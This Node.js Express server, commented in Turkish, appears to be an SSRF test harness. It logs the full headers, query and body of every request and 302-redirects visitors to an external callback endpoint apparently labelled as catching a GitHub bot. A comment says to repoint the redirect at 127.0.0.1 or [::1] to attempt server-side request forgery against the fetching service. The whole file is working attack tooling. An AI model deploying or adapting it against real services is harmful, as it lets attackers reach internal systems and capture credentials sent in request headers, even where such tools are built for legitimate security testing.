const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Detaylı Loglama Middleware'i
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    
    console.log('\n========================================');
    console.log(`[${timestamp}] YENİ İSTEK YAKALANDI!`);
    console.log('========================================');
    console.log(`Method    : ${req.method}`);
    console.log(`URL       : ${req.url}`);
    console.log(`IP        : ${req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress}`);
    console.log(`User-Agent: ${req.headers['user-agent'] || 'Bilinmiyor'}`);
    console.log(`Host      : ${req.headers['host'] || 'Bilinmiyor'}`);
    
    console.log('--- TÜM HEADERS ---');
    console.log(JSON.stringify(req.headers, null, 2));
    
    console.log('--- QUERY PARAMETRELERİ ---');
    console.log(JSON.stringify(req.query, null, 2));
    
    console.log('--- BODY (Eğer varsa) ---');
    console.log(JSON.stringify(req.body, null, 2));
    console.log('----------------------------------------\n');
    
    next();
});

// 1. Ana Domain (Buradan yönlendirmeyi başlatıyoruz)
app.get('/', (req, res) => {
    // Şimdilik test için Render adresinde bırakabilirsin. 
    // SSRF denemek istediğinde burayı 'http://[::1]' veya 'http://127.0.0.1' yapacaksın.
    const internalTarget = 'https://collab-fv3u.onrender.com/yakalandi-github'; 
    
    console.log(`[!] YÖNLENDİRME BAŞLATILIYOR ➔ Hedef: ${internalTarget}`);
    
    // 302 Redirect
    return res.redirect(302, internalTarget);
});

// 2. Yönlendirme Takibi İçin Endpoint
app.get('/yakalandi-github', (req, res) => {
    console.log('[+] BAŞARILI: Bot yönlendirmeyi takip edip bu ek noktaya ulaştı!');
    return res.status(200).send("Redirect success logged.");
});

app.listen(3000, () => {
    console.log("🚀 Gelişmiş Log Avcısı 3000 portunda devrede!");
});
